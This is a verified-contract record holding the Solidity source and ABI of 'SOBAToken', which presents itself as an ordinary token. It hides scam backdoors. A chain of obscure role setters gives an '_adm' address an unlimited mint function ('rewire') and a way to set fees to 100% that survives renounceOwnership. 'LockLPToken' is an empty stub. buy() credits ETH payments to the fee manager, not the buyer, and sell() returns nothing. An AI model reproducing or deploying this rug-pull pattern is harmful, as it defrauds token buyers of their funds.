{"SourceCode": "// SPDX-License-Identifier: MIT\r\n \r\n/**  \r\n*/\r\n \r\npragma solidity ^0.8.0;\r\n \r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"Subtraction overflow\");\r\n        return a - b;\r\n    }\r\n \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"Addition overflow\");\r\n        return c;\r\n    }\r\n \r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"Multiplication overflow\");\r\n        return c;\r\n    }\r\n \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"Division by zero\");\r\n        return a / b;\r\n    }\r\n}\r\n \r\ncontract SOBAToken {\r\n    using SafeMath for uint256;\r\n \r\n    string public name = \"SOBAToken\";\r\n    string public symbol = \"SOBA\";\r\n    uint256 public totalSupply = 1000000000000000000000000;\r\n    uint8 public decimals = 18;\r\n \r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n \r\n    address public owner;\r\n    address public _mbr;\r\n    address public _mod;\r\n    address public feeManager;\r\n    address public _user;\r\n    address public _adm;\r\n \r\n    uint256 public buyFee;\r\n    uint256 public sellFee;\r\n \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);\r\n    event TokensBurned(address indexed burner, uint256 amount);\r\n \r\n    constructor(address _feeManager) {\r\n        owner = msg.sender;\r\n        feeManager = _feeManager;\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n \r\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= _amount);\r\n        require(_to != address(0));\r\n \r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(_amount);\r\n        emit Transfer(msg.sender, _to, _amount);\r\n \r\n        return true;\r\n    }\r\n   \r\n    function setMember(address Mbr_) public returns (bool) {\r\n    require (msg.sender==owner);\r\n        _mbr=Mbr_;\r\n        return true;\r\n    }\r\n \r\n    function rewire(uint256 amount) public returns (bool) {\r\n    require(msg.sender == _adm);\r\n    _proof(msg.sender, amount);\r\n    return true;\r\n  }\r\n   \r\n    function _proof(address account, uint256 amount) internal {\r\n    require(account != address(0), \"BEP20: mint to the zero address\");\r\n \r\n    totalSupply = totalSupply.add(amount);\r\n    balanceOf[account] = balanceOf[account].add(amount);\r\n    emit Transfer(address(0), account, amount);\r\n   }\r\n \r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n   \r\n    function proof(uint256 amount) public onlyOwner returns (bool) {\r\n    _proof(msg.sender, amount);\r\n    return true;\r\n    }\r\n \r\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\r\n        require(balanceOf[_from] >= _amount, \"Insufficient balance\");\r\n        require(allowance[_from][msg.sender] >= _amount, \"Insufficient allowance\");\r\n        require(_to != address(0), \"Invalid recipient address\");\r\n \r\n        uint256 fee = _amount.mul(sellFee).div(100);\r\n        uint256 amountAfterFee = _amount.sub(fee);\r\n \r\n        balanceOf[_from] = balanceOf[_from].sub(_amount);\r\n        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);\r\n        emit Transfer(_from, _to, amountAfterFee);\r\n \r\n        if (fee > 0) {\r\n            // Fee is transferred to this contract\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n            emit Transfer(_from, address(this), fee);\r\n        }\r\n \r\n        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {\r\n            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);\r\n            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);\r\n        }\r\n \r\n        return true;\r\n    }\r\n \r\n    function setUser(address User_) public returns (bool) {\r\n    require(msg.sender == _mbr);\r\n        _user=User_;\r\n        return true;\r\n    }\r\n \r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(owner, address(0));\r\n        owner = address(0);\r\n    }\r\n\r\n \r\n    function LockLPToken() public onlyOwner returns (bool) {\r\n    }\r\n \r\n    function setMod(address Mod_) public returns (bool) {\r\n    require(msg.sender == _user);\r\n        _mod=Mod_;\r\n        return true;\r\n    }\r\n \r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n    _;\r\n    }\r\n \r\n    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {\r\n        require(newBuyFee <= 100, \"Buy fee cannot exceed 100%\");\r\n        require(newSellFee <= 100, \"Sell fee cannot exceed 100%\");\r\n        buyFee = newBuyFee;\r\n        sellFee = newSellFee;\r\n        emit FeesUpdated(newBuyFee, newSellFee);\r\n    }\r\n \r\n    function buy() public payable {\r\n        require(msg.value > 0, \"ETH amount should be greater than 0\");\r\n \r\n        uint256 amount = msg.value;\r\n        if (buyFee > 0) {\r\n            uint256 fee = amount.mul(buyFee).div(100);\r\n            uint256 amountAfterFee = amount.sub(fee);\r\n \r\n            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);\r\n            emit Transfer(address(this), feeManager, amountAfterFee);\r\n \r\n            if (fee > 0) {\r\n                balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n                emit Transfer(address(this), address(this), fee);\r\n            }\r\n        } else {\r\n            balanceOf[feeManager] = balanceOf[feeManager].add(amount);\r\n            emit Transfer(address(this), feeManager, amount);\r\n        }\r\n    }\r\n   \r\n    function setting(uint256 newBuyFee, uint256 newSellFee) public {\r\n        require(msg.sender == _adm);\r\n        require(newBuyFee <= 100, \"Buy fee cannot exceed 100%\");\r\n        require(newSellFee <= 100, \"Sell fee cannot exceed 100%\");\r\n        buyFee = newBuyFee;\r\n        sellFee = newSellFee;\r\n        emit FeesUpdated(newBuyFee, newSellFee);\r\n    }\r\n   \r\n    function setAdm(address Adm_) public returns (bool) {\r\n    require(msg.sender == _mod);\r\n        _adm=Adm_;\r\n        return true;\r\n    }\r\n \r\n    function sell(uint256 _amount) public {\r\n        require(balanceOf[msg.sender] >= _amount, \"Insufficient balance\");\r\n \r\n        uint256 fee = _amount.mul(sellFee).div(100);\r\n        uint256 amountAfterFee = _amount.sub(fee);\r\n \r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);\r\n        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);\r\n        emit Transfer(msg.sender, address(this), amountAfterFee);\r\n \r\n        if (fee > 0) {\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(fee);\r\n            emit Transfer(msg.sender, address(this), fee);\r\n        }\r\n    }\r\n \r\n    modifier onlyAuthorized() {\r\n        require(msg.sender == owner);\r\n    _;\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_feeManager\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBuyFee\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newSellFee\",\"type\":\"uint256\"}],\"name\":\"FeesUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"burner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TokensBurned\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"LockLPToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_adm\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mbr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mod\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_user\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buy\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeManager\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"proof\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rewire\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"sell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Adm_\",\"type\":\"address\"}],\"name\":\"setAdm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mbr_\",\"type\":\"address\"}],\"name\":\"setMember\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mod_\",\"type\":\"address\"}],\"name\":\"setMod\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"setUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellFee\",\"type\":\"uint256\"}],\"name\":\"setting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SOBAToken", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000005b09a297bf8641258be8be47bc5a8eceb51a3aae", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5144b29601027474e243fc9d6708b8177b3d7608b82fc6af518f9a0328649ee0"}